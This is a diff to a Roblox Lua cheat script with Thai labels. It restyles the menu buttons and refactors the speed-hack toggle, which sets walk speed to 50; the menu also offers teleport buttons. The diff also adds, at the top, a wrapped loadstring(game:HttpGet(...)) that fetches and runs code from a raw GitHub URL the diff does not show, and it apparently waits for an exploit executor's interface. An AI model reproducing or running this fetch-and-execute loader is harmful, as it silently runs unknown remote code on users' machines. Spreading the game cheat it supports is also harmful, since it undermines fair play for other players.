@@ -1,3 +1,15 @@
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/objwghd-maker/QQ/refs/heads/main/Script%20Lua"))()
+end)
+
+local playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+
+repeat
+    task.wait(0.1)
+until not playerGui:FindFirstChild("DeltaHologramSequence")
+
+task.wait(0.2)
+
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local CoreGui = game:GetService("CoreGui")
@@ -81,7 +93,7 @@ ToggleMenuBtn.Size = UDim2.new(0, 150, 0, 48)
 ToggleMenuBtn.Position = UDim2.new(0.02, 0, 0.15, 0)
 ToggleMenuBtn.BackgroundColor3 = Color3.fromRGB(8, 12, 20)
 ToggleMenuBtn.Text = "  SYSTEM"
-ToggleMenuBtn.TextColor3 = Color3.fromRGB(0, 240, 255)
+ToggleMenuBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 ToggleMenuBtn.TextSize = 18
 ToggleMenuBtn.Font = Enum.Font.GothamBold
 ToggleMenuBtn.Active = true
@@ -201,19 +213,22 @@ local CloseStroke = Instance.new("UIStroke", CloseBtn)
 CloseStroke.Color = Color3.fromRGB(255, 50, 50)
 CloseStroke.Thickness = 1.5
 
-CloseBtn.MouseButton1Click:Connect(function()
-    MainFrame.Visible = false
-    TweenService:Create(ToggleMenuBtn, TweenInfo.new(0.2), {BackgroundTransparency = 0}):Play()
-end)
-
-ToggleMenuBtn.MouseButton1Click:Connect(function()
+local function toggleMenu()
     MainFrame.Visible = not MainFrame.Visible
     if MainFrame.Visible then
         TweenService:Create(ToggleMenuBtn, TweenInfo.new(0.2), {BackgroundTransparency = 0.5}):Play()
     else
         TweenService:Create(ToggleMenuBtn, TweenInfo.new(0.2), {BackgroundTransparency = 0}):Play()
     end
-end)
+end
+
+local function closeMenu()
+    MainFrame.Visible = false
+    TweenService:Create(ToggleMenuBtn, TweenInfo.new(0.2), {BackgroundTransparency = 0}):Play()
+end
+
+ToggleMenuBtn.MouseButton1Click:Connect(toggleMenu)
+CloseBtn.MouseButton1Click:Connect(closeMenu)
 
 local LineSeparator = Instance.new("Frame")
 LineSeparator.Size = UDim2.new(1, -24, 0, 1)
@@ -243,7 +258,7 @@ local function CreateSciFiButton(text, callback)
     btn.Size = UDim2.new(1, -4, 0, 45)
     btn.BackgroundColor3 = Color3.fromRGB(12, 18, 30)
     btn.Text = text
-    btn.TextColor3 = Color3.fromRGB(200, 220, 255)
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
     btn.TextSize = 13
     btn.Font = Enum.Font.GothamBold
     btn.TextXAlignment = Enum.TextXAlignment.Center
@@ -277,11 +292,52 @@ local defaultSpeed = 16
 local targetSpeed = 50
 local speedConnection = nil
 
-local SpeedBtn = CreateSciFiButton("วิ่งเร็ว 50 : OFF", function()
+local SpeedBtn = Instance.new("TextButton")
+SpeedBtn.Size = UDim2.new(1, -4, 0, 45)
+SpeedBtn.BackgroundColor3 = Color3.fromRGB(12, 18, 30)
+SpeedBtn.Text = "วิ่งเร็ว 50 : OFF"
+SpeedBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+SpeedBtn.TextSize = 13
+SpeedBtn.Font = Enum.Font.GothamBold
+SpeedBtn.TextXAlignment = Enum.TextXAlignment.Center
+SpeedBtn.Parent = Container
+
+local SpeedBtnCorner = Instance.new("UICorner")
+SpeedBtnCorner.CornerRadius = UDim.new(0, 6)
+SpeedBtnCorner.Parent = SpeedBtn
+
+local SpeedBtnStroke = Instance.new("UIStroke")
+SpeedBtnStroke.Color = Color3.fromRGB(0, 200, 230)
+SpeedBtnStroke.Thickness = 1.5
+SpeedBtnStroke.Parent = SpeedBtn
+
+SpeedBtn.MouseEnter:Connect(function()
+    if speedEnabled then
+        TweenService:Create(SpeedBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(25, 55, 45)}):Play()
+        TweenService:Create(SpeedBtnStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(0, 255, 200)}):Play()
+    else
+        TweenService:Create(SpeedBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(20, 30, 50)}):Play()
+        TweenService:Create(SpeedBtnStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(0, 255, 255)}):Play()
+    end
+end)
+
+SpeedBtn.MouseLeave:Connect(function()
+    if speedEnabled then
+        TweenService:Create(SpeedBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(15, 40, 30)}):Play()
+        TweenService:Create(SpeedBtnStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(0, 255, 150)}):Play()
+    else
+        TweenService:Create(SpeedBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(12, 18, 30)}):Play()
+        TweenService:Create(SpeedBtnStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(0, 200, 230)}):Play()
+    end
+end)
+
+local function toggleSpeed()
     speedEnabled = not speedEnabled
     if speedEnabled then
         SpeedBtn.Text = "วิ่งเร็ว 50 : ON"
-        SpeedBtn.TextColor3 = Color3.fromRGB(80, 255, 150)
+        TweenService:Create(SpeedBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(15, 40, 30)}):Play()
+        TweenService:Create(SpeedBtnStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(0, 255, 150)}):Play()
+        
         speedConnection = RunService.Heartbeat:Connect(function()
             local char = LocalPlayer.Character
             if char and char:FindFirstChildOfClass("Humanoid") then
@@ -291,7 +347,9 @@ local SpeedBtn = CreateSciFiButton("วิ่งเร็ว 50 : OFF", function
         SendNotification("ระบบความเร็ว", "เปิดใช้งาน Speed 50 เรียบร้อย")
     else
         SpeedBtn.Text = "วิ่งเร็ว 50 : OFF"
-        SpeedBtn.TextColor3 = Color3.fromRGB(200, 220, 255)
+        TweenService:Create(SpeedBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(12, 18, 30)}):Play()
+        TweenService:Create(SpeedBtnStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(0, 200, 230)}):Play()
+        
         if speedConnection then speedConnection:Disconnect() end
         local char = LocalPlayer.Character
         if char and char:FindFirstChildOfClass("Humanoid") then
@@ -299,7 +357,9 @@ local SpeedBtn = CreateSciFiButton("วิ่งเร็ว 50 : OFF", function
         end
         SendNotification("ระบบความเร็ว", "ปิดการใช้งานแล้ว")
     end
-end)
+end
+
+SpeedBtn.MouseButton1Click:Connect(toggleSpeed)
 
 CreateSciFiButton("ไปที่ประตู", function()
     local char = LocalPlayer.Character
@@ -324,3 +384,4 @@ CreateSciFiButton("ไปที่ลงทะเบียนผู้ป่ว�
         SendNotification("เทเลพอร์ต", "เดินทางไปจุดลงทะเบียนสำเร็จ")
     end
 end)
+
